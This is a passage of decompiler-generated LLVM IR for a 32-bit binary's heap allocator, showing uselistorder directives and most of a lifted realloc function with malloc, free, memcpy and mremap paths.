  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 1, 11, 12, 14, 15, 16, 17, 0, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_805eb40.231, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134604820, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_805e820.219, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805e80c.216 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805e80c.216 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_80503b8, { 1, 0 }
  uselistorder label %dec_label_pc_80503a7, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_805039a, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050396, { 1, 0 }
  uselistorder label %dec_label_pc_805038c, { 1, 0 }
  uselistorder label %dec_label_pc_8050337, { 1, 0 }
  uselistorder label %dec_label_pc_805030e, { 1, 0 }
  uselistorder label %dec_label_pc_80502fb, { 1, 0 }
  uselistorder label %dec_label_pc_80502e9, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805027b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050276, { 1, 0 }
  uselistorder label %dec_label_pc_805025a, { 1, 0 }
  uselistorder label %dec_label_pc_8050203, { 1, 0 }
  uselistorder label %dec_label_pc_80501ec, { 1, 0 }
  uselistorder label %dec_label_pc_80501d5, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8050158, { 1, 0 }
  uselistorder label %dec_label_pc_805014b, { 1, 0 }
  uselistorder label %dec_label_pc_805010c, { 1, 0 }
  uselistorder label %dec_label_pc_80500e5, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80500c9, { 1, 0 }
  uselistorder label %dec_label_pc_80500b0, { 1, 0 }
  uselistorder label %dec_label_pc_8050092, { 1, 0 }
  uselistorder label %dec_label_pc_804ffad, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ffa5, { 1, 0 }
  uselistorder label %dec_label_pc_804ff8e, { 1, 0 }
  uselistorder label %dec_label_pc_804ff21, { 1, 0 }
  uselistorder label %dec_label_pc_804ff26.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804fefa, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fe81, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_804fe08, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804fdf1, { 1, 0 }
  uselistorder label %dec_label_pc_804fd5f, { 1, 0 }
  uselistorder label %dec_label_pc_804fe30.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fd2c, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804fcaa, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_80503c6 = load i32, i32* @esi, align 4
  %v0_80503c7 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_80503cf = icmp eq i32* %arg1, null
  %v1_80503d4 = icmp eq i1 %v4_80503cf, false
  br i1 %v1_80503d4, label %dec_label_pc_80503e6, label %dec_label_pc_80503d6

dec_label_pc_80503d6:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_80503da = call i32 @malloc(i32 %arg2)
  store i32 %v1_80503da, i32* %eax.global-to-local, align 4
  store i32 %v1_80503da, i32* @ebx, align 4
  br label %dec_label_pc_80506df

dec_label_pc_80503e6:                             ; preds = %entry
  %v1_80503e6 = icmp eq i32 %arg2, 0
  %v1_80503e8 = icmp eq i1 %v1_80503e6, false
  br i1 %v1_80503e8, label %dec_label_pc_80503fb, label %dec_label_pc_80503ea

dec_label_pc_80503ea:                             ; preds = %dec_label_pc_80503e6
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_80503f1 = call i32 @free(i32 %tmp7)
  store i32 %v1_80503f1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506df

dec_label_pc_80503fb:                             ; preds = %dec_label_pc_80503e6
  %v2_8050406 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050406, i32* @eax, align 4
  store i32 %v2_8050406, i32* %stack_var_-60, align 4
  %v2_805040b = call i32 @__pthread_return_void(i32 %v2_8050406, i32 134550743)
  store i32 %v2_805040b, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8058370.214 to i32), i32* %stack_var_-60, align 4
  %v1_8050417 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058370.214 to i32))
  store i32 %v1_8050417, i32* %eax.global-to-local, align 4
  %v0_805041f = load i32, i32* @ebx, align 4
  %tmp20 = icmp ult i32 %v0_805041f, -32
  br i1 %tmp20, label %dec_label_pc_8050436, label %dec_label_pc_8050424

dec_label_pc_8050424:                             ; preds = %dec_label_pc_80503fb
  %v0_8050424 = load i32, i32* %stack_var_-60, align 4
  %v1_8050424 = call i32 @__errno_location(i32 %v0_8050424)
  store i32 %v1_8050424, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805042b = inttoptr i32 %v1_8050424 to i32*
  store i32 12, i32* %v1_805042b, align 4
  br label %dec_label_pc_80506e2

dec_label_pc_8050436:                             ; preds = %dec_label_pc_80503fb
  %v1_8050436 = add i32 %v0_805041f, 11
  %tmp21 = icmp ult i32 %v1_8050436, 16
  br i1 %tmp21, label %dec_label_pc_805044d, label %dec_label_pc_8050446

dec_label_pc_8050446:                             ; preds = %dec_label_pc_8050436
  %v1_8050446 = and i32 %v1_8050436, -8
  br label %dec_label_pc_805044d

dec_label_pc_805044d:                             ; preds = %dec_label_pc_8050436, %dec_label_pc_8050446
  %stack_var_-40.0 = phi i32 [ %v1_8050446, %dec_label_pc_8050446 ], [ 16, %dec_label_pc_8050436 ]
  %storemerge27 = phi i32 [ %v1_8050446, %dec_label_pc_8050446 ], [ %v1_8050436, %dec_label_pc_8050436 ]
  store i32 %storemerge27, i32* %eax.global-to-local, align 4
  %v1_8050451 = add i32 %tmp7, -8
  store i32 %v1_8050451, i32* @edi, align 4
  %v1_8050454 = add i32 %tmp7, -4
  %v2_8050454 = inttoptr i32 %v1_8050454 to i32*
  %v3_8050454 = load i32, i32* %v2_8050454, align 4
  store i32 %v3_8050454, i32* @edx, align 4
  %v1_8050459 = and i32 %v3_8050454, -4
  store i32 %v1_8050459, i32* %eax.global-to-local, align 4
  %v2_8050460 = and i32 %v3_8050454, 2
  %v3_8050460 = icmp eq i32 %v2_8050460, 0
  %v1_8050463 = icmp eq i1 %v3_8050460, false
  br i1 %v1_8050463, label %dec_label_pc_80505fd, label %dec_label_pc_8050469

dec_label_pc_8050469:                             ; preds = %dec_label_pc_805044d
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8050459, i32* @ebx, align 4
  %v7_805046f = icmp ult i32 %v1_8050459, %stack_var_-40.0
  %v1_8050471 = icmp eq i1 %v7_805046f, false
  br i1 %v1_8050471, label %dec_label_pc_80505a8, label %dec_label_pc_8050477

dec_label_pc_8050477:                             ; preds = %dec_label_pc_8050469
  %v2_8050477 = add i32 %v1_8050459, %v1_8050451
  store i32 %v2_8050477, i32* @esi, align 4
  %v1_805047a = load i32, i32* @global_var_805e80c.216, align 4
  %v12_805047a = icmp eq i32 %v2_8050477, %v1_805047a
  %v1_8050480 = icmp eq i1 %v12_805047a, false
  %v1_80504ba = add i32 %v2_8050477, 4
  %v2_80504ba = inttoptr i32 %v1_80504ba to i32*
  %v3_80504ba = load i32, i32* %v2_80504ba, align 4
  br i1 %v1_8050480, label %dec_label_pc_80504ba, label %dec_label_pc_8050482

dec_label_pc_8050482:                             ; preds = %dec_label_pc_8050477
  %v1_8050487 = and i32 %v3_80504ba, -4
  %v2_805048a = add i32 %v1_8050487, %v1_8050459
  store i32 %v2_805048a, i32* %ecx.global-to-local, align 4
  %v1_8050490 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8050490, i32* %eax.global-to-local, align 4
  %v7_8050493 = icmp ult i32 %v2_805048a, %v1_8050490
  br i1 %v7_8050493, label %dec_label_pc_80504f8, label %dec_label_pc_8050497

dec_label_pc_8050497:                             ; preds = %dec_label_pc_8050482
  %v1_8050497 = urem i32 %v3_8050454, 2
  %v5_805049a = or i32 %v1_8050497, %stack_var_-40.0
  store i32 %v5_805049a, i32* @edx, align 4
  store i32 %v5_805049a, i32* %v2_8050454, align 4
  %v0_80504a5 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80504a5 = sub i32 %v0_80504a5, %stack_var_-40.0
  %v0_80504a7 = load i32, i32* @edi, align 4
  %v2_80504a7 = add i32 %v0_80504a7, %stack_var_-40.0
  store i32 %v2_80504a7, i32* %eax.global-to-local, align 4
  %v1_80504aa = or i32 %v2_80504a5, 1
  store i32 %v1_80504aa, i32* %ecx.global-to-local, align 4
  store i32 %v2_80504a7, i32* @global_var_805e80c.216, align 4
  %v2_80504b2 = add i32 %v2_80504a7, 4
  %v3_80504b2 = inttoptr i32 %v2_80504b2 to i32*
  store i32 %v1_80504aa, i32* %v3_80504b2, align 4
  br label %dec_label_pc_80506cd

dec_label_pc_80504ba:                             ; preds = %dec_label_pc_8050477
  %v1_80504bf = and i32 %v3_80504ba, -2
  store i32 %v1_80504bf, i32* %eax.global-to-local, align 4
  %v3_80504c2 = add i32 %v1_80504ba, %v1_80504bf
  %v4_80504c2 = inttoptr i32 %v3_80504c2 to i8*
  %v5_80504c2 = load i8, i8* %v4_80504c2, align 1
  %v6_80504c2 = urem i8 %v5_80504c2, 2
  %v7_80504c2 = icmp eq i8 %v6_80504c2, 0
  %v1_80504c7 = icmp eq i1 %v7_80504c2, false
  br i1 %v1_80504c7, label %dec_label_pc_80504f8, label %dec_label_pc_80504c9

dec_label_pc_80504c9:                             ; preds = %dec_label_pc_80504ba
  %v1_80504c9 = and i32 %v3_80504ba, -4
  %v2_80504d0 = add i32 %v1_80504c9, %v1_8050459
  store i32 %v2_80504d0, i32* @ebx, align 4
  %v10_80504d2 = icmp ult i32 %v2_80504d0, %stack_var_-40.0
  br i1 %v10_80504d2, label %dec_label_pc_80504f8, label %dec_label_pc_80504d8

dec_label_pc_80504d8:                             ; preds = %dec_label_pc_80504c9
  %v1_80504d8 = add i32 %v1_8050459, %tmp7
  %v2_80504d8 = inttoptr i32 %v1_80504d8 to i32*
  %v3_80504d8 = load i32, i32* %v2_80504d8, align 4
  store i32 %v3_80504d8, i32* @edx, align 4
  %v1_80504db = add i32 %v2_8050477, 12
  %v2_80504db = inttoptr i32 %v1_80504db to i32*
  %v3_80504db = load i32, i32* %v2_80504db, align 4
  store i32 %v3_80504db, i32* %eax.global-to-local, align 4
  %v1_80504de = add i32 %v3_80504d8, 12
  %v2_80504de = inttoptr i32 %v1_80504de to i32*
  %v3_80504de = load i32, i32* %v2_80504de, align 4
  %v15_80504de = icmp eq i32 %v3_80504de, %v2_8050477
  %v1_80504e1 = icmp eq i1 %v15_80504de, false
  br i1 %v1_80504e1, label %dec_label_pc_80504e8, label %dec_label_pc_80504e3

dec_label_pc_80504e3:                             ; preds = %dec_label_pc_80504d8
  %v1_80504e3 = add i32 %v3_80504db, 8
  %v2_80504e3 = inttoptr i32 %v1_80504e3 to i32*
  %v3_80504e3 = load i32, i32* %v2_80504e3, align 4
  %v15_80504e3 = icmp eq i32 %v3_80504e3, %v2_8050477
  br i1 %v15_80504e3, label %dec_label_pc_80504ed, label %dec_label_pc_80504e8

dec_label_pc_80504e8:                             ; preds = %dec_label_pc_80504e3, %dec_label_pc_80504d8
  %v0_80504e8 = call i32 @abort()
  store i32 %v0_80504e8, i32* %eax.global-to-local, align 4
  %v1_80504ed.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80504ed

dec_label_pc_80504ed:                             ; preds = %dec_label_pc_80504e3, %dec_label_pc_80504e8
  %v1_80504ed = phi i32 [ %v3_80504d8, %dec_label_pc_80504e3 ], [ %v1_80504ed.pre, %dec_label_pc_80504e8 ]
  %v0_80504ed = phi i32 [ %v3_80504db, %dec_label_pc_80504e3 ], [ %v0_80504e8, %dec_label_pc_80504e8 ]
  %v2_80504ed = add i32 %v1_80504ed, 12
  %v3_80504ed = inttoptr i32 %v2_80504ed to i32*
  store i32 %v0_80504ed, i32* %v3_80504ed, align 4
  %v0_80504f0 = load i32, i32* @edx, align 4
  %v1_80504f0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80504f0 = add i32 %v1_80504f0, 8
  %v3_80504f0 = inttoptr i32 %v2_80504f0 to i32*
  store i32 %v0_80504f0, i32* %v3_80504f0, align 4
  %v0_80505a8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80505a8

dec_label_pc_80504f8:                             ; preds = %dec_label_pc_80504c9, %dec_label_pc_80504ba, %dec_label_pc_8050482
  %v1_80504ff = add i32 %stack_var_-40.0, -7
  store i32 %v1_80504ff, i32* %eax.global-to-local, align 4
  store i32 %v1_80504ff, i32* %stack_var_-60, align 4
  %v1_8050503 = call i32 @malloc(i32 %v1_80504ff)
  store i32 %v1_8050503, i32* %eax.global-to-local, align 4
  store i32 %v1_8050503, i32* @edx, align 4
  %v1_805050d = icmp eq i32 %v1_8050503, 0
  br i1 %v1_805050d, label %dec_label_pc_80506c9, label %dec_label_pc_8050515

dec_label_pc_8050515:                             ; preds = %dec_label_pc_80504f8
  %v1_8050515 = add i32 %v1_8050503, -8
  store i32 %v1_8050515, i32* %ebx.global-to-local, align 4
  %v1_8050518 = load i32, i32* @esi, align 4
  %v12_8050518 = icmp eq i32 %v1_8050515, %v1_8050518
  %v1_805051a = add i32 %v1_8050503, -4
  %v2_805051a = inttoptr i32 %v1_805051a to i32*
  %v3_805051a = load i32, i32* %v2_805051a, align 4
  store i32 %v3_805051a, i32* %eax.global-to-local, align 4
  %v1_805051d = icmp eq i1 %v12_8050518, false
  br i1 %v1_805051d, label %dec_label_pc_805052b, label %dec_label_pc_805051f

dec_label_pc_805051f:                             ; preds = %dec_label_pc_8050515
  %v1_805051f = and i32 %v3_805051a, -4
  store i32 %v1_805051f, i32* %eax.global-to-local, align 4
  store i32 %v1_8050459, i32* @edx, align 4
  %v2_8050526 = add i32 %v1_805051f, %v1_8050459
  store i32 %v2_8050526, i32* @ebx, align 4
  br label %dec_label_pc_80505a8

dec_label_pc_805052b:                             ; preds = %dec_label_pc_8050515
  %v1_805052f = add i32 %v1_8050459, -4
  store i32 %v1_805052f, i32* %eax.global-to-local, align 4
  %v2_8050534 = udiv i32 %v1_805052f, 4
  store i32 %v2_8050534, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805052f, 37
  br i1 %tmp, label %dec_label_pc_805054d, label %dec_label_pc_805053c

dec_label_pc_805053c:                             ; preds = %dec_label_pc_805052b
  store i32 %v1_8050503, i32* %stack_var_-60, align 4
  %v3_8050543 = inttoptr i32 %v1_8050503 to i16*
  %v4_8050543 = call i32 @memcpy(i16* %v3_8050543, i32 %tmp7, i32 %v1_805052f)
  store i32 %v4_8050543, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050594

dec_label_pc_805054d:                             ; preds = %dec_label_pc_805052b
  store i32 %tmp7, i32* @esi, align 4
  %v2_8050554 = load i32, i32* %arg1, align 4
  store i32 %v2_8050554, i32* %eax.global-to-local, align 4
  %v2_8050556 = inttoptr i32 %v1_8050503 to i32*
  store i32 %v2_8050554, i32* %v2_8050556, align 4
  %v0_8050558 = load i32, i32* @esi, align 4
  %v1_8050558 = add i32 %v0_8050558, 4
  %v2_8050558 = inttoptr i32 %v1_8050558 to i32*
  %v3_8050558 = load i32, i32* %v2_8050558, align 4
  store i32 %v3_8050558, i32* %eax.global-to-local, align 4
  %v1_805055b = load i32, i32* @edx, align 4
  %v2_805055b = add i32 %v1_805055b, 4
  %v3_805055b = inttoptr i32 %v2_805055b to i32*
  store i32 %v3_8050558, i32* %v3_805055b, align 4
  %v0_805055e = load i32, i32* @esi, align 4
  %v1_805055e = add i32 %v0_805055e, 8
  %v2_805055e = inttoptr i32 %v1_805055e to i32*
  %v3_805055e = load i32, i32* %v2_805055e, align 4
  store i32 %v3_805055e, i32* %eax.global-to-local, align 4
  %v1_8050561 = load i32, i32* @edx, align 4
  %v2_8050561 = add i32 %v1_8050561, 8
  %v3_8050561 = inttoptr i32 %v2_8050561 to i32*
  store i32 %v3_805055e, i32* %v3_8050561, align 4
  %tmp28 = icmp ult i32 %v1_805052f, 17
  br i1 %tmp28, label %dec_label_pc_8050594, label %dec_label_pc_8050566

dec_label_pc_8050566:                             ; preds = %dec_label_pc_805054d
  %v0_8050566 = load i32, i32* @esi, align 4
  %v1_8050566 = add i32 %v0_8050566, 12
  %v2_8050566 = inttoptr i32 %v1_8050566 to i32*
  %v3_8050566 = load i32, i32* %v2_8050566, align 4
  store i32 %v3_8050566, i32* %eax.global-to-local, align 4
  %v0_8050569 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805056c = load i32, i32* @edx, align 4
  %v2_805056c = add i32 %v1_805056c, 12
  %v3_805056c = inttoptr i32 %v2_805056c to i32*
  store i32 %v3_8050566, i32* %v3_805056c, align 4
  %v0_805056f = load i32, i32* @esi, align 4
  %v1_805056f = add i32 %v0_805056f, 16
  %v2_805056f = inttoptr i32 %v1_805056f to i32*
  %v3_805056f = load i32, i32* %v2_805056f, align 4
  store i32 %v3_805056f, i32* %eax.global-to-local, align 4
  %v1_8050572 = load i32, i32* @edx, align 4
  %v2_8050572 = add i32 %v1_8050572, 16
  %v3_8050572 = inttoptr i32 %v2_8050572 to i32*
  store i32 %v3_805056f, i32* %v3_8050572, align 4
  %tmp22 = icmp ult i32 %v0_8050569, 7
  br i1 %tmp22, label %dec_label_pc_8050594, label %dec_label_pc_8050577

dec_label_pc_8050577:                             ; preds = %dec_label_pc_8050566
  %v0_8050577 = load i32, i32* @esi, align 4
  %v1_8050577 = add i32 %v0_8050577, 20
  %v2_8050577 = inttoptr i32 %v1_8050577 to i32*
  %v3_8050577 = load i32, i32* %v2_8050577, align 4
  store i32 %v3_8050577, i32* %eax.global-to-local, align 4
  %v0_805057a = load i32, i32* %ecx.global-to-local, align 4
  %v1_805057d = load i32, i32* @edx, align 4
  %v2_805057d = add i32 %v1_805057d, 20
  %v3_805057d = inttoptr i32 %v2_805057d to i32*
  store i32 %v3_8050577, i32* %v3_805057d, align 4
  %v0_8050580 = load i32, i32* @esi, align 4
  %v1_8050580 = add i32 %v0_8050580, 24
  %v2_8050580 = inttoptr i32 %v1_8050580 to i32*
  %v3_8050580 = load i32, i32* %v2_8050580, align 4
  store i32 %v3_8050580, i32* %eax.global-to-local, align 4
  %v1_8050583 = load i32, i32* @edx, align 4
  %v2_8050583 = add i32 %v1_8050583, 24
  %v3_8050583 = inttoptr i32 %v2_8050583 to i32*
  store i32 %v3_8050580, i32* %v3_8050583, align 4
  %tmp23 = icmp ult i32 %v0_805057a, 9
  br i1 %tmp23, label %dec_label_pc_8050594, label %dec_label_pc_8050588

dec_label_pc_8050588:                             ; preds = %dec_label_pc_8050577
  %v0_8050588 = load i32, i32* @esi, align 4
  %v1_8050588 = add i32 %v0_8050588, 28
  %v2_8050588 = inttoptr i32 %v1_8050588 to i32*
  %v3_8050588 = load i32, i32* %v2_8050588, align 4
  store i32 %v3_8050588, i32* %eax.global-to-local, align 4
  %v1_805058b = load i32, i32* @edx, align 4
  %v2_805058b = add i32 %v1_805058b, 28
  %v3_805058b = inttoptr i32 %v2_805058b to i32*
  store i32 %v3_8050588, i32* %v3_805058b, align 4
  %v0_805058e = load i32, i32* @esi, align 4
  %v1_805058e = add i32 %v0_805058e, 32
  %v2_805058e = inttoptr i32 %v1_805058e to i32*
  %v3_805058e = load i32, i32* %v2_805058e, align 4
  store i32 %v3_805058e, i32* %eax.global-to-local, align 4
  %v1_8050591 = load i32, i32* @edx, align 4
  %v2_8050591 = add i32 %v1_8050591, 32
  %v3_8050591 = inttoptr i32 %v2_8050591 to i32*
  store i32 %v3_805058e, i32* %v3_8050591, align 4
  br label %dec_label_pc_8050594

dec_label_pc_8050594:                             ; preds = %dec_label_pc_8050577, %dec_label_pc_8050566, %dec_label_pc_805054d, %dec_label_pc_805053c, %dec_label_pc_8050588
  %v0_8050597 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050597 = add i32 %v0_8050597, 8
  store i32 %v1_8050597, i32* @ebx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_805059e = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_80506c4

dec_label_pc_80505a8:                             ; preds = %dec_label_pc_8050469, %dec_label_pc_805051f, %dec_label_pc_80504ed
  %v1_80505b9 = phi i32 [ %v1_8050459, %dec_label_pc_8050469 ], [ %v2_8050526, %dec_label_pc_805051f ], [ %v0_80505a8.pre, %dec_label_pc_80504ed ]
  %v5_80505aa = sub i32 %v1_80505b9, %stack_var_-40.0
  store i32 %v5_80505aa, i32* %ecx.global-to-local, align 4
  %tmp24 = icmp ult i32 %v5_80505aa, 16
  br i1 %tmp24, label %dec_label_pc_80505b3, label %dec_label_pc_80505c5

dec_label_pc_80505b3:                             ; preds = %dec_label_pc_80505a8
  %v0_80505b3 = load i32, i32* @edi, align 4
  %v1_80505b3 = add i32 %v0_80505b3, 4
  %v2_80505b3 = inttoptr i32 %v1_80505b3 to i32*
  %v3_80505b3 = load i32, i32* %v2_80505b3, align 4
  %v1_80505b6 = urem i32 %v3_80505b3, 2
  %v2_80505b9 = or i32 %v1_80505b6, %v1_80505b9
  store i32 %v2_80505b9, i32* %eax.global-to-local, align 4
  store i32 %v2_80505b9, i32* %v2_80505b3, align 4
  %v0_80505be = load i32, i32* @edi, align 4
  %v1_80505be = load i32, i32* @ebx, align 4
  %v2_80505be = add i32 %v0_80505be, 4
  %v3_80505be = add i32 %v2_80505be, %v1_80505be
  %v4_80505be = inttoptr i32 %v3_80505be to i32*
  %v5_80505be = load i32, i32* %v4_80505be, align 4
  %v6_80505be = or i32 %v5_80505be, 1
  store i32 %v6_80505be, i32* %v4_80505be, align 4
  br label %dec_label_pc_80505f5

dec_label_pc_80505c5:                             ; preds = %dec_label_pc_80505a8
  %v0_80505c9 = load i32, i32* @edi, align 4
  %v2_80505c9 = add i32 %v0_80505c9, %stack_var_-40.0
  store i32 %v2_80505c9, i32* %eax.global-to-local, align 4
  %v1_80505cc = add i32 %v0_80505c9, 4
  %v2_80505cc = inttoptr i32 %v1_80505cc to i32*
  %v3_80505cc = load i32, i32* %v2_80505cc, align 4
  %v1_80505cf = urem i32 %v3_80505cc, 2
  %v5_80505d2 = or i32 %v1_80505cf, %stack_var_-40.0
  store i32 %v5_80505d2, i32* %v2_80505cc, align 4
  %v0_80505dc = load i32, i32* %ecx.global-to-local, align 4
  %v1_80505de = or i32 %v0_80505dc, 1
  store i32 %v1_80505de, i32* @edx, align 4
  %v1_80505e1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80505e1 = add i32 %v1_80505e1, 4
  %v3_80505e1 = inttoptr i32 %v2_80505e1 to i32*
  store i32 %v1_80505de, i32* %v3_80505e1, align 4
  %v0_80505e4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80505e4 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80505e4 = add i32 %v0_80505e4, 4
  %v3_80505e4 = add i32 %v2_80505e4, %v1_80505e4
  %v4_80505e4 = inttoptr i32 %v3_80505e4 to i32*
  %v5_80505e4 = load i32, i32* %v4_80505e4, align 4
  %v6_80505e4 = or i32 %v5_80505e4, 1
  store i32 %v6_80505e4, i32* %v4_80505e4, align 4
  %v0_80505e9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80505e9 = add i32 %v0_80505e9, 8
  store i32 %v1_80505e9, i32* %eax.global-to-local, align 4
  store i32 %v1_80505e9, i32* %stack_var_-60, align 4
  %v1_80505ed = call i32 @free(i32 %v1_80505e9)
  store i32 %v1_80505ed, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80505f5

dec_label_pc_80505f5:                             ; preds = %dec_label_pc_80505b3, %dec_label_pc_80505c5
  %v0_80505f5 = load i32, i32* @edi, align 4
  %v1_80505f5 = add i32 %v0_80505f5, 8
  store i32 %v1_80505f5, i32* @ebx, align 4
  br label %dec_label_pc_80506d1

dec_label_pc_80505fd:                             ; preds = %dec_label_pc_805044d
  store i32 %tmp7, i32* %ecx.global-to-local, align 4
  %v0_8050601 = load i32, i32* @global_var_805eb3c.221, align 4
  %v1_8050606 = add i32 %v0_8050601, -1
  store i32 %v1_8050606, i32* %eax.global-to-local, align 4
  %v2_805060b = inttoptr i32 %v1_8050451 to i32*
  %v3_805060b = load i32, i32* %v2_805060b, align 4
  store i32 %v3_805060b, i32* @ebp, align 4
  %v1_805060e = or i32 %stack_var_-40.0, 4
  store i32 %v1_805060e, i32* %stack_var_-44, align 4
  %v2_8050614 = add i32 %v3_805060b, %v1_8050606
  store i32 %v2_8050614, i32* @edx, align 4
  %v1_8050617 = sub i32 0, %v0_8050601
  store i32 %v1_8050617, i32* %eax.global-to-local, align 4
  %v2_8050619 = add i32 %v2_8050614, %v1_805060e
  %v2_805061c = and i32 %v2_8050619, %v1_8050617
  store i32 %v2_805061c, i32* @esi, align 4
  %v2_8050620 = sub i32 %v2_805061c, %v3_805060b
  store i32 %v2_8050620, i32* @ebx, align 4
  %v15_8050622 = icmp eq i32 %v1_8050459, %v2_8050620
  br i1 %v15_8050622, label %dec_label_pc_80506cd, label %dec_label_pc_805062c

dec_label_pc_805062c:                             ; preds = %dec_label_pc_80505fd
  %v2_8050633 = sub i32 %v1_8050451, %v3_805060b
  store i32 %v2_8050633, i32* @edi, align 4
  %v2_8050635 = add i32 %v3_805060b, %v1_8050459
  store i32 %v2_8050635, i32* %eax.global-to-local, align 4
  store i32 %v2_8050633, i32* %stack_var_-60, align 4
  %v6_8050639 = call i32 @mremap(i32 %v2_8050633, i32 %v2_8050635, i32 %v2_805061c, i32 1, i32 %v1_805060e, i32 %v1_8050459)
  store i32 %v6_8050639, i32* %eax.global-to-local, align 4
  %v10_8050641 = icmp eq i32 %v6_8050639, -1
  br i1 %v10_8050641, label %dec_label_pc_8050685, label %dec_label_pc_8050646

dec_label_pc_8050646:                             ; preds = %dec_label_pc_805062c
  %v1_8050646 = load i32, i32* @ebp, align 4
  %v2_8050646 = add i32 %v1_8050646, %v6_8050639
  store i32 %v2_8050646, i32* @edx, align 4
  %v0_8050649 = load i32, i32* @ebx, align 4
  %v1_8050649 = or i32 %v0_8050649, 2
  store i32 %v1_8050649, i32* %ebx.global-to-local, align 4
  %v0_805064c = load i32, i32* @esi, align 4
  store i32 %v0_805064c, i32* %eax.global-to-local, align 4
  %v2_805064e = add i32 %v2_8050646, 4
  %v3_805064e = inttoptr i32 %v2_805064e to i32*
  store i32 %v1_8050649, i32* %v3_805064e, align 4
  %v0_8050651 = load i32, i32* %eax.global-to-local, align 4
  %v5_8050651 = sub i32 %v0_8050651, %v1_8050459
  %v1_8050655 = load i32, i32* @global_var_805eb44.226, align 4
  %v2_8050655 = add i32 %v1_8050655, %v5_8050651
  store i32 %v2_8050655, i32* %eax.global-to-local, align 4
  store i32 %v2_8050655, i32* @global_var_805eb44.226, align 4
  %v1_8050660 = load i32, i32* @global_var_805eb50.227, align 16
  %tmp25 = icmp ugt i32 %v2_8050655, %v1_8050660
  br i1 %tmp25, label %dec_label_pc_8050668, label %dec_label_pc_805066d

dec_label_pc_8050668:                             ; preds = %dec_label_pc_8050646
  store i32 %v2_8050655, i32* @global_var_805eb50.227, align 16
  br label %dec_label_pc_805066d

dec_label_pc_805066d:                             ; preds = %dec_label_pc_8050646, %dec_label_pc_8050668
  %v1_805066d = load i32, i32* @global_var_805eb48.228, align 8
  %v2_805066d = add i32 %v1_805066d, %v2_8050655
  store i32 %v2_805066d, i32* %eax.global-to-local, align 4
  %v1_8050673 = load i32, i32* @global_var_805eb54.229, align 4
  %tmp26 = icmp ugt i32 %v2_805066d, %v1_8050673
  br i1 %tmp26, label %dec_label_pc_805067b, label %dec_label_pc_8050680

dec_label_pc_805067b:                             ; preds = %dec_label_pc_805066d
  store i32 %v2_805066d, i32* @global_var_805eb54.229, align 4
  br label %dec_label_pc_8050680

